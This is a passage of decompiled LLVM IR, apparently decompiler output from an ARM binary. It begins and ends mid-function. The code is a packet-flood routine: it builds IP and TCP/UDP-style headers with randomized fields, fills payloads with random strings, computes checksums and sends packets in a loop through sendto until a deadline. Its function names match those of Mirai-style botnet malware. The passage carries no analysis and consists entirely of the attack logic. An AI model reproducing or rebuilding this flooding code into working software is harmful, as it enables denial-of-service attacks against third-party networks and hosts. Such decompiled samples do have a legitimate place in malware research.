  %v3_a9a8 = add i32 %v2_a9a8, 12
  %v4_a9a8 = inttoptr i32 %v3_a9a8 to i8*
  store i8 %v1_a9a8, i8* %v4_a9a8, align 1
  %v0_a9ac = load i32, i32* %r4.global-to-local, align 4
  %v1_a9ac = add i32 %v0_a9ac, 38
  %v2_a9ac = inttoptr i32 %v1_a9ac to i8*
  %v3_a9ac = load i8, i8* %v2_a9ac, align 1
  %tmp86 = urem i8 %v3_a9ac, 16
  %v1_a9b0 = zext i8 %tmp86 to i32
  %v1_a9b4 = or i32 %v1_a9b0, 64
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  %v1_a9b8 = trunc i32 %v1_a9b4 to i8
  store i8 %v1_a9b8, i8* %v2_a9ac, align 1
  %v0_a9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a9bc = add i32 %v0_a9bc, 38
  %v2_a9bc = inttoptr i32 %v1_a9bc to i8*
  %v3_a9bc = load i8, i8* %v2_a9bc, align 1
  %v4_a9bc = zext i8 %v3_a9bc to i32
  %v1_a9c0 = and i32 %v4_a9bc, 240
  %v1_a9c4 = or i32 %v1_a9c0, 5
  store i32 %v1_a9c4, i32* %r2.global-to-local, align 4
  %v1_a9c8 = trunc i32 %v1_a9c4 to i8
  store i8 %v1_a9c8, i8* %v2_a9bc, align 1
  store i32 %v4_a948, i32* %ip.global-to-local, align 4
  %v0_a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 38
  store i32 %v1_a9d0, i32* @r5, align 4
  %v3_a9d4 = add i32 %v0_a9d0, 39
  %v4_a9d4 = inttoptr i32 %v3_a9d4 to i8*
  store i8 %v5_a6d0, i8* %v4_a9d4, align 1
  store i32 %v5_a8d0, i32* %lr.global-to-local, align 4
  %v2_a9dc = load i32, i32* @r5, align 4
  %v3_a9dc = add i32 %v2_a9dc, 2
  %v4_a9dc = inttoptr i32 %v3_a9dc to i16*
  store i16 %v5_a8e8, i16* %v4_a9dc, align 2
  store i32 %v1_a6f4, i32* %r1.global-to-local, align 4
  %v0_a9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a9e4, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_a9ec = load i32, i32* @r5, align 4
  %v4_a9ec = add i32 %v3_a9ec, 6
  %v5_a9ec = inttoptr i32 %v4_a9ec to i16*
  store i16 64, i16* %v5_a9ec, align 2
  %v0_a9f0.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_a9f0.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v5_a6ec.sink.off0 = phi i8 [ %v1_a954, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_a9f0 = load i32, i32* @r5, align 4
  %v3_a9f0 = add i32 %v2_a9f0, 8
  %v4_a9f0 = inttoptr i32 %v3_a9f0 to i8*
  store i8 %v5_a6ec.sink.off0, i8* %v4_a9f0, align 1
  %v0_a9f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f4 = trunc i32 %v0_a9f4 to i8
  %v2_a9f4 = load i32, i32* @r5, align 4
  %v3_a9f4 = add i32 %v2_a9f4, 9
  %v4_a9f4 = inttoptr i32 %v3_a9f4 to i8*
  store i8 %v1_a9f4, i8* %v4_a9f4, align 1
  %v0_a9f8 = load i32, i32* @fp, align 4
  %v1_a9f8 = trunc i32 %v0_a9f8 to i16
  %v2_a9f8 = load i32, i32* @r5, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 4
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 %v1_a9f8, i16* %v4_a9f8, align 2
  %v0_a9fc = call i32 @rand_next()
  store i32 %v0_a9fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* %ip.global-to-local, align 4
  store i1 %v2_aa08, i1* %cpsr_z.global-to-local, align 1
  %v1_aa0c = sub i32 1023, %v0_a9fc
  store i32 %v1_aa0c, i32* %r3.global-to-local, align 4
  br i1 %v2_aa08, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_aa14 = load i32, i32* @r5, align 4
  %v3_aa14 = add i32 %v2_aa14, 16
  %v4_aa14 = inttoptr i32 %v3_aa14 to i32*
  store i32 %v1_aa0c, i32* %v4_aa14, align 4
  br label %bb80

.thread10:                                        ; preds = %bb79
  %v1_aa10 = load i32, i32* %r4.global-to-local, align 4
  %v2_aa10 = add i32 %v1_aa10, 16
  %v3_aa10 = inttoptr i32 %v2_aa10 to i32*
  %v4_aa10 = load i32, i32* %v3_aa10, align 4
  store i32 %v4_aa10, i32* %r3.global-to-local, align 4
  %v2_aa18 = load i32, i32* @r5, align 4
  %v3_aa18 = add i32 %v2_aa18, 16
  %v4_aa18 = inttoptr i32 %v3_aa18 to i32*
  store i32 %v4_aa10, i32* %v4_aa18, align 4
  br label %bb80

bb80:                                             ; preds = %.thread9, %.thread10
  %v1_aa1c = load i32, i32* @r5, align 4
  %v2_aa1c = add i32 %v1_aa1c, 12
  %v3_aa1c = inttoptr i32 %v2_aa1c to i32*
  store i32 %v0_a9fc, i32* %v3_aa1c, align 4
  %v3_aa20 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_aa20, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @lr, align 4
  %v0_aa28 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa28 = add i32 %v0_aa28, 58
  store i32 %v1_aa28, i32* @r6, align 4
  store i32 %v4_aa2c, i32* %r1.global-to-local, align 4
  %v1_aa30 = add i32 %v3_aa20, 1
  store i32 %v1_aa30, i32* @r4, align 4
  store i32 %v4_aa34, i32* %r2.global-to-local, align 4
  %v9_aa38 = icmp eq i32 %v1_aa30, %arg2
  store i1 %v9_aa38, i1* %cpsr_z.global-to-local, align 1
  %v0_aa3c = load i32, i32* @r8, align 4
  %v1_aa3c = trunc i32 %v0_aa3c to i16
  %v3_aa3c = add i32 %v0_aa28, 62
  %v4_aa3c = inttoptr i32 %v3_aa3c to i16*
  store i16 %v1_aa3c, i16* %v4_aa3c, align 2
  %v0_aa40 = load i32, i32* %r1.global-to-local, align 4
  %v1_aa40 = trunc i32 %v0_aa40 to i16
  %v2_aa40 = load i32, i32* @r6, align 4
  %v3_aa40 = inttoptr i32 %v2_aa40 to i16*
  store i16 %v1_aa40, i16* %v3_aa40, align 2
  %v0_aa44 = load i32, i32* %r2.global-to-local, align 4
  %v1_aa44 = trunc i32 %v0_aa44 to i16
  %v2_aa44 = load i32, i32* @r6, align 4
  %v3_aa44 = add i32 %v2_aa44, 2
  %v4_aa44 = inttoptr i32 %v3_aa44 to i16*
  store i16 %v1_aa44, i16* %v4_aa44, align 2
  %v0_aa48 = load i32, i32* @r4, align 4
  store i32 %v0_aa48, i32* %stack_var_-44, align 4
  %v5_aa4c = icmp slt i32 %v1_aa30, %arg2
  br i1 %v5_aa4c, label %dec_label_pc_a8f4, label %dec_label_pc_aa50.preheader

dec_label_pc_aa50.preheader:                      ; preds = %bb80, %dec_label_pc_a814
  %v1_aa6c = add i32 %v5_a764, 8
  %v1_aa70 = add i32 %v5_a764, 66
  %v2_aa7c = icmp eq i32 %v5_a7b8, -1
  %v7_aa7c = icmp eq i32 %v5_a7b8, -1
  %v3_ac74 = icmp eq i32 %v3_a82c, 65535
  %v2_acc4 = icmp eq i32 %v1_a828, 0
  %v2_aad8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_aaf0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_ab00 = ptrtoint i32* %stack_var_-56 to i32
  %v2_ab0c = ptrtoint i32* %stack_var_-54 to i32
  %v2_ab20 = icmp eq i32 %v1_a784, 0
  br label %dec_label_pc_aa50

dec_label_pc_aa50:                                ; preds = %dec_label_pc_aa50.preheader, %dec_label_pc_ad04
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_ad04, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa50
  store i32 %v5_a764, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_aa6c, i32* @fp, align 4
  store i32 %v1_aa70, i32* @sb, align 4
  br label %dec_label_pc_abd8

dec_label_pc_aa78:                                ; preds = %dec_label_pc_abd8
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_aa84:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ac74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ac74, label %dec_label_pc_ac80, label %dec_label_pc_aa98

dec_label_pc_aa98:                                ; preds = %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge, %dec_label_pc_aa84
  %v1_aa9c = phi i32 [ %v1_aa9c.pre, %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge ], [ 65535, %dec_label_pc_aa84 ]
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v9_aa9c = icmp eq i32 %v3_a830, %v1_aa9c
  store i1 %v9_aa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa9c, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aaa4:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v1_aaa8 = phi i32 [ %v1_aca0, %dec_label_pc_ac80 ], [ %v1_aa9c, %dec_label_pc_aa98 ]
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v9_aaa8 = icmp eq i32 %v3_a834, %v1_aaa8
  store i1 %v9_aaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aaa8, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_aab0:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %dec_label_pc_acd8, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_aab0
  %v1_aab8 = load i32, i32* @r5, align 4
  %v2_aab8 = add i32 %v1_aab8, 16
  %v3_aab8 = inttoptr i32 %v2_aab8 to i32*
  %v4_aab8 = load i32, i32* %v3_aab8, align 4
  store i32 %v4_aab8, i32* %r3.global-to-local, align 4
  %v2_aabc = load i32, i32* @r6, align 4
  %v3_aabc = add i32 %v2_aabc, 16
  %v4_aabc = inttoptr i32 %v3_aabc to i32*
  store i32 %v4_aab8, i32* %v4_aabc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %bb81, %.thread11, %dec_label_pc_acd8
  %v0_aac4 = call i32 @rand_next()
  store i32 %v0_aac4, i32* %r0.global-to-local, align 4
  store i32 %v0_aac4, i32* %stack_var_-48, align 4
  %v0_aacc = call i32 @rand_next()
  store i32 %v0_aacc, i32* %r0.global-to-local, align 4
  store i32 %v0_aacc, i32* %stack_var_-52, align 4
  %v0_aad4 = call i32 @rand_next()
  store i32 %v2_aad8, i32* %r1.global-to-local, align 4
  store i32 %v0_aad4, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_aae4 = load i32, i32* @r7, align 4
  store i32 %v0_aae4, i32* %r0.global-to-local, align 4
  %v3_aae8 = call i32 @util_memcpy(i32 %v0_aae4, i32 %v2_aad8, i32 4)
  %v0_aaec = load i32, i32* @r7, align 4
  %v1_aaec = add i32 %v0_aaec, 6
  store i32 %v1_aaec, i32* %r0.global-to-local, align 4
  store i32 %v2_aaf0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aaf8 = call i32 @util_memcpy(i32 %v1_aaec, i32 %v2_aaf0, i32 4)
  %v0_aafc = load i32, i32* @r7, align 4
  %v1_aafc = add i32 %v0_aafc, 4
  store i32 %v1_aafc, i32* %r0.global-to-local, align 4
  store i32 %v2_ab00, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab08 = call i32 @util_memcpy(i32 %v1_aafc, i32 %v2_ab00, i32 2)
  store i32 %v2_ab0c, i32* %r1.global-to-local, align 4
  %v0_ab10 = load i32, i32* @r7, align 4
  %v1_ab10 = add i32 %v0_ab10, 10
  store i32 %v1_ab10, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_ab18 = call i32 @util_memcpy(i32 %v1_ab10, i32 %v2_ab0c, i32 2)
  store i32 %v3_ab18, i32* %r0.global-to-local, align 4
  store i32 %v1_a784, i32* %r1.global-to-local, align 4
  store i1 %v2_ab20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ab20, label %dec_label_pc_ab28, label %dec_label_pc_ace4

dec_label_pc_ab28:                                ; preds = %dec_label_pc_aac4, %dec_label_pc_ace4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ab2c = load i32, i32* @r5, align 4
  %v3_ab2c = add i32 %v2_ab2c, 10
  %v4_ab2c = inttoptr i32 %v3_ab2c to i16*
  store i16 0, i16* %v4_ab2c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab34 = load i32, i32* @r5, align 4
  store i32 %v0_ab34, i32* @r0, align 4
  %v2_ab38 = call i32 @checksum_generic(i32 %v0_ab34, i32 20)
  %v3_ab38 = trunc i32 %v2_ab38 to i16
  store i32 0, i32* %ip.global-to-local, align 4
  %v3_ab40 = load i32, i32* @r5, align 4
  %v4_ab40 = add i32 %v3_ab40, 10
  %v5_ab40 = inttoptr i32 %v4_ab40 to i16*
  store i16 %v3_ab38, i16* %v5_ab40, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ab48 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab48 = trunc i32 %v0_ab48 to i16
  %v2_ab48 = load i32, i32* @r6, align 4
  %v3_ab48 = add i32 %v2_ab48, 10
  %v4_ab48 = inttoptr i32 %v3_ab48 to i16*
  store i16 %v1_ab48, i16* %v4_ab48, align 2
  %v0_ab4c = load i32, i32* @r6, align 4
  store i32 %v0_ab4c, i32* @r0, align 4
  %v2_ab50 = call i32 @checksum_generic(i32 %v0_ab4c, i32 20)
  %v3_ab50 = trunc i32 %v2_ab50 to i16
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  %v3_ab54 = load i32, i32* @r6, align 4
  %v4_ab54 = add i32 %v3_ab54, 10
  %v5_ab54 = inttoptr i32 %v4_ab54 to i16*
  store i16 %v3_ab50, i16* %v5_ab54, align 2
  %v2_ab5c = load i32, i32* @r8, align 4
  %v3_ab5c = add i32 %v2_ab5c, 6
  %v4_ab5c = inttoptr i32 %v3_ab5c to i16*
  store i16 0, i16* %v4_ab5c, align 2
  %v0_ab60 = load i32, i32* @r8, align 4
  store i32 %v0_ab60, i32* @r1, align 4
  %v1_ab64 = add i32 %v0_ab60, 4
  %v2_ab64 = inttoptr i32 %v1_ab64 to i16*
  %v3_ab64 = load i16, i16* %v2_ab64, align 2
  %v4_ab64 = zext i16 %v3_ab64 to i32
  store i32 %v4_ab64, i32* %r2.global-to-local, align 4
  %v0_ab68 = load i32, i32* @fp, align 4
  store i32 %v0_ab68, i32* %r3.global-to-local, align 4
  %v0_ab6c = load i32, i32* @r6, align 4
  store i32 %v0_ab6c, i32* %r0.global-to-local, align 4
  %v4_ab70 = call i32 @checksum_tcpudp(i32 %v0_ab6c, i32 %v0_ab60, i32 %v4_ab64, i32 %v0_ab68)
  %v5_ab70 = trunc i32 %v4_ab70 to i16
  store i32 %v4_ab70, i32* %r0.global-to-local, align 4
  %v3_ab74 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ab74, i32* %r2.global-to-local, align 4
  %v3_ab78 = mul i32 %v3_ab74, 32
  store i32 %v3_ab78, i32* %r3.global-to-local, align 4
  %v0_ab7c = load i32, i32* @r5, align 4
  %v1_ab7c = add i32 %v0_ab7c, 16
  %v2_ab7c = inttoptr i32 %v1_ab7c to i32*
  %v3_ab7c = load i32, i32* %v2_ab7c, align 4
  %v5_ab80 = mul i32 %v3_ab74, 24
  store i32 %v5_ab80, i32* %r3.global-to-local, align 4
  %v1_ab84 = load i32, i32* @sl, align 4
  %v2_ab84 = add i32 %v1_ab84, %v5_ab80
  store i32 %v2_ab84, i32* @lr, align 4
  %v2_ab88 = add i32 %v2_ab84, 4
  %v3_ab88 = inttoptr i32 %v2_ab88 to i32*
  store i32 %v3_ab7c, i32* %v3_ab88, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ab94 = load i32, i32* @r8, align 4
  %v4_ab94 = add i32 %v3_ab94, 6
  %v5_ab94 = inttoptr i32 %v4_ab94 to i16*
  store i16 %v5_ab70, i16* %v5_ab94, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ab9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab9c = trunc i32 %v0_ab9c to i16
  %v2_ab9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ab9c = load i32, i32* @sl, align 4
  %v4_ab9c = add i32 %v3_ab9c, %v2_ab9c
  %v5_ab9c = inttoptr i32 %v4_ab9c to i16*
  store i16 %v1_ab9c, i16* %v5_ab9c, align 2
  %v0_aba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aba0 = trunc i32 %v0_aba0 to i16
  %v2_aba0 = load i32, i32* @lr, align 4
  %v3_aba0 = add i32 %v2_aba0, 2
  %v4_aba0 = inttoptr i32 %v3_aba0 to i16*
  store i16 %v1_aba0, i16* %v4_aba0, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_aba8 = load i32, i32* @r5, align 4
  store i32 %v0_aba8, i32* %r1.global-to-local, align 4
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v0_abb0 = load i32, i32* @sb, align 4
  store i32 %v0_abb0, i32* %r2.global-to-local, align 4
  %v0_abb4 = load i32, i32* @lr, align 4
  %v0_abb8 = load i32, i32* %ip.global-to-local, align 4
  %v6_abbc = call i32 @__libc_sendto(i32 %v3_a7dc, i32 %v0_aba8, i32 %v0_abb0, i32 16384, i32 %v0_abb4, i32 %v0_abb8)
  %v3_abc0 = load i32, i32* %stack_var_-44, align 4
  %v1_abc4 = add i32 %v3_abc0, 1
  store i32 %v1_abc4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v9_abcc = icmp eq i32 %v1_abc4, %arg2
  store i1 %v9_abcc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_abc4, i32* %stack_var_-44, align 4
  %v6_abd4 = icmp slt i32 %v1_abc4, %arg2
  br i1 %v6_abd4, label %dec_label_pc_abd8, label %dec_label_pc_ad04

dec_label_pc_abd8:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa64
  %v1_abec = phi i32 [ %v1_abc4, %dec_label_pc_ab28 ], [ 0, %dec_label_pc_aa64 ]
  %v5_abdc = mul i32 %v1_abec, 24
  %v1_abe0 = load i32, i32* @sl, align 4
  %v2_abe0 = add i32 %v1_abe0, %v5_abdc
  store i32 %v2_abe0, i32* %r3.global-to-local, align 4
  store i32 %v2_a698, i32* %lr.global-to-local, align 4
  %v1_abe8 = add i32 %v2_abe0, 20
  %v2_abe8 = inttoptr i32 %v1_abe8 to i8*
  %v3_abe8 = load i8, i8* %v2_abe8, align 1
  %v4_abe8 = zext i8 %v3_abe8 to i32
  store i32 %v4_abe8, i32* %r2.global-to-local, align 4
  %v4_abec = mul i32 %v1_abec, 4
  %v5_abec = add i32 %v4_abec, %v2_a698
  %v6_abec = inttoptr i32 %v5_abec to i32*
  %v7_abec = load i32, i32* %v6_abec, align 4
  store i32 %v7_abec, i32* @r5, align 4
  %v2_abf0 = icmp ugt i8 %v3_abe8, 30
  %v7_abf0 = icmp eq i8 %v3_abe8, 31
  store i1 %v7_abf0, i1* %cpsr_z.global-to-local, align 1
  %v1_abf4 = add i32 %v7_abec, 24
  store i32 %v1_abf4, i32* @r7, align 4
  %v1_abf8 = add i32 %v7_abec, 38
  store i32 %v1_abf8, i32* @r6, align 4
  %v1_abfc = add i32 %v7_abec, 58
  store i32 %v1_abfc, i32* @r8, align 4
  %v2_ac00 = xor i1 %v7_abf0, true
  %v3_ac00 = and i1 %v2_abf0, %v2_ac00
  br i1 %v3_ac00, label %dec_label_pc_aa78, label %dec_label_pc_ac04

dec_label_pc_ac04:                                ; preds = %dec_label_pc_abd8
  %v1_ac04 = add i32 %v2_abe0, 16
  %v2_ac04 = inttoptr i32 %v1_ac04 to i32*
  %v3_ac04 = load i32, i32* %v2_ac04, align 4
  store i32 %v3_ac04, i32* %r4.global-to-local, align 4
  %v0_ac08 = call i32 @rand_next()
  store i32 %v0_ac08, i32* %r0.global-to-local, align 4
  %v3_ac0c = load i32, i32* %stack_var_-44, align 4
  %v5_ac14 = mul i32 %v3_ac0c, 24
  %v1_ac18 = and i32 %v3_ac04, 16711680
  store i32 %v1_ac18, i32* %ip.global-to-local, align 4
  %v3_ac1c = udiv i32 %v3_ac04, 16777216
  %v4_ac20 = udiv i32 %v1_ac18, 256
  %v5_ac20 = or i32 %v4_ac20, %v3_ac1c
  store i32 %v5_ac20, i32* %r2.global-to-local, align 4
  %v1_ac24 = load i32, i32* @sl, align 4
  %v2_ac24 = add i32 %v1_ac24, %v5_ac14
  store i32 %v2_ac24, i32* %r1.global-to-local, align 4
  %v1_ac28 = and i32 %v3_ac04, 65280
  store i32 %v1_ac28, i32* %r3.global-to-local, align 4
  %v1_ac2c = add i32 %v2_ac24, 20
  %v2_ac2c = inttoptr i32 %v1_ac2c to i8*
  %v3_ac2c = load i8, i8* %v2_ac2c, align 1
  %v4_ac2c = zext i8 %v3_ac2c to i32
  store i32 %v4_ac2c, i32* %ip.global-to-local, align 4
  %v5_ac34 = call i32 @llvm.bswap.i32(i32 %v3_ac04)
  %v7_ac38 = lshr i32 %v0_ac08, %v4_ac2c
  %v8_ac38 = add i32 %v7_ac38, %v5_ac34
  store i32 %v8_ac38, i32* %r2.global-to-local, align 4
  %v1_ac3c = and i32 %v8_ac38, 16711680
  store i32 %v1_ac3c, i32* %r0.global-to-local, align 4
  store i32 %v5_a7b8, i32* %r1.global-to-local, align 4
  %v5_ac54 = call i32 @llvm.bswap.i32(i32 %v8_ac38)
  store i32 %v5_ac54, i32* %r3.global-to-local, align 4
  store i1 %v7_aa7c, i1* %cpsr_z.global-to-local, align 1
  %v1_ac5c = load i32, i32* @r5, align 4
  %v2_ac5c = add i32 %v1_ac5c, 16
  %v3_ac5c = inttoptr i32 %v2_ac5c to i32*
  store i32 %v5_ac54, i32* %v3_ac5c, align 4
  br i1 %v2_aa7c, label %dec_label_pc_ac64, label %dec_label_pc_aa84

dec_label_pc_ac64:                                ; preds = %dec_label_pc_ac04, %dec_label_pc_aa78
  %v0_ac64 = call i32 @rand_next()
  store i32 %v0_ac64, i32* %r0.global-to-local, align 4
  store i32 %v3_a82c, i32* %r2.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_ac74, i1* %cpsr_z.global-to-local, align 1
  %v1_ac78 = load i32, i32* @r5, align 4
  %v2_ac78 = add i32 %v1_ac78, 12
  %v3_ac78 = inttoptr i32 %v2_ac78 to i32*
  store i32 %v0_ac64, i32* %v3_ac78, align 4
  br i1 %v3_ac74, label %dec_label_pc_ac80, label %dec_label_pc_ac64.dec_label_pc_aa98_crit_edge

dec_label_pc_ac64.dec_label_pc_aa98_crit_edge:    ; preds = %dec_label_pc_ac64
  %v1_aa9c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aa98

dec_label_pc_ac80:                                ; preds = %dec_label_pc_ac64, %dec_label_pc_aa84
  %v0_ac80 = call i32 @rand_next()
  %v3_ac88 = urem i32 %v0_ac80, 65536
  store i32 %v3_ac88, i32* %r0.global-to-local, align 4
  %v1_ac90 = sub nsw i32 999, %v3_ac88
  store i32 %v1_ac90, i32* %r3.global-to-local, align 4
  %v1_ac94 = trunc i32 %v0_ac80 to i16
  %v2_ac94 = load i32, i32* @r5, align 4
  %v3_ac94 = add i32 %v2_ac94, 4
  %v4_ac94 = inttoptr i32 %v3_ac94 to i16*
  store i16 %v1_ac94, i16* %v4_ac94, align 2
  %v0_ac98 = load i32, i32* %r3.global-to-local, align 4
  %v1_ac98 = trunc i32 %v0_ac98 to i16
  %v2_ac98 = load i32, i32* @r6, align 4
  %v3_ac98 = add i32 %v2_ac98, 4
  %v4_ac98 = inttoptr i32 %v3_ac98 to i16*
  store i16 %v1_ac98, i16* %v4_ac98, align 2
  store i32 %v3_a830, i32* %r3.global-to-local, align 4
  %v1_aca0 = load i32, i32* @r4, align 4
  %v9_aca0 = icmp eq i32 %v3_a830, %v1_aca0
  store i1 %v9_aca0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aca0, label %dec_label_pc_aca8, label %dec_label_pc_aaa4

dec_label_pc_aca8:                                ; preds = %dec_label_pc_ac80, %dec_label_pc_aa98
  %v0_aca8 = call i32 @rand_next()
  %v1_aca8 = trunc i32 %v0_aca8 to i16
  store i32 %v0_aca8, i32* %r0.global-to-local, align 4
  store i32 %v3_a834, i32* %ip.global-to-local, align 4
  %v1_acb0 = load i32, i32* @r4, align 4
  %v9_acb0 = icmp eq i32 %v3_a834, %v1_acb0
  store i1 %v9_acb0, i1* %cpsr_z.global-to-local, align 1
  %v3_acb4 = load i32, i32* @r5, align 4
  %v4_acb4 = add i32 %v3_acb4, 58
  %v5_acb4 = inttoptr i32 %v4_acb4 to i16*
  store i16 %v1_aca8, i16* %v5_acb4, align 2
  br i1 %v9_acb0, label %dec_label_pc_acbc, label %dec_label_pc_aab0

dec_label_pc_acbc:                                ; preds = %dec_label_pc_aca8, %dec_label_pc_aaa4
  %v0_acbc = call i32 @rand_next()
  %v1_acbc = trunc i32 %v0_acbc to i16
  store i32 %v0_acbc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* @lr, align 4
  store i1 %v2_acc4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acc4, label %.thread24, label %bb81

.thread24:                                        ; preds = %dec_label_pc_acbc
  %v3_accc25 = load i32, i32* @r8, align 4
  %v4_accc26 = add i32 %v3_accc25, 2
  %v5_accc27 = inttoptr i32 %v4_accc26 to i16*
  store i16 %v1_acbc, i16* %v5_accc27, align 2
  br label %dec_label_pc_acd8

bb81:                                             ; preds = %dec_label_pc_acbc
  %v1_acc8 = load i32, i32* @r5, align 4
  %v2_acc8 = add i32 %v1_acc8, 16
  %v3_acc8 = inttoptr i32 %v2_acc8 to i32*
  %v4_acc8 = load i32, i32* %v3_acc8, align 4
  store i32 %v4_acc8, i32* %r3.global-to-local, align 4
  %v3_accc = load i32, i32* @r8, align 4
  %v4_accc = add i32 %v3_accc, 2
  %v5_accc = inttoptr i32 %v4_accc to i16*
  store i16 %v1_acbc, i16* %v5_accc, align 2
  %v1_acd0 = load i32, i32* %r3.global-to-local, align 4
  %v2_acd0 = load i32, i32* @r6, align 4
  %v3_acd0 = add i32 %v2_acd0, 16
  %v4_acd0 = inttoptr i32 %v3_acd0 to i32*
  store i32 %v1_acd0, i32* %v4_acd0, align 4
  br label %dec_label_pc_aac4

dec_label_pc_acd8:                                ; preds = %.thread24, %dec_label_pc_aab0
  %v0_acd8 = call i32 @rand_next()
  store i32 %v0_acd8, i32* %r0.global-to-local, align 4
  %v1_acdc = load i32, i32* @r6, align 4
  %v2_acdc = add i32 %v1_acdc, 16
  %v3_acdc = inttoptr i32 %v2_acdc to i32*
  store i32 %v0_acd8, i32* %v3_acdc, align 4
  br label %dec_label_pc_aac4

dec_label_pc_ace4:                                ; preds = %dec_label_pc_aac4
  %v0_ace4 = load i32, i32* @r8, align 4
  %v1_ace4 = add i32 %v0_ace4, 8
  store i32 %v1_ace4, i32* @r4, align 4
  store i32 %v1_ace4, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r1.global-to-local, align 4
  %v2_acf0 = call i32 @rand_alphastr(i32 %v1_ace4, i32 %v5_a764)
  store i32 %v2_acf0, i32* %r0.global-to-local, align 4
  store i32 %v5_a764, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_acfc = load i32, i32* @r4, align 4
  %v4_acfc = add i32 %v2_acfc, %v5_a764
  %v5_acfc = inttoptr i32 %v4_acfc to i8*
  store i8 0, i8* %v5_acfc, align 1
  br label %dec_label_pc_ab28

dec_label_pc_ad04:                                ; preds = %dec_label_pc_ab28, %dec_label_pc_aa50
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ad08 = call i32 @__GI_time(i32* null)
  store i32 %v2_ad08, i32* %r0.global-to-local, align 4
  store i32 %v2_a7c8, i32* %ip.global-to-local, align 4
  %v9_ad10 = icmp eq i32 %v2_a7c8, %v2_ad08
  store i1 %v9_ad10, i1* %cpsr_z.global-to-local, align 1
  %v6_ad14 = icmp slt i32 %v2_a7c8, %v2_ad08
  br i1 %v6_ad14, label %dec_label_pc_ad18, label %dec_label_pc_aa50

dec_label_pc_ad18:                                ; preds = %dec_label_pc_ad04, %entry, %dec_label_pc_ad24
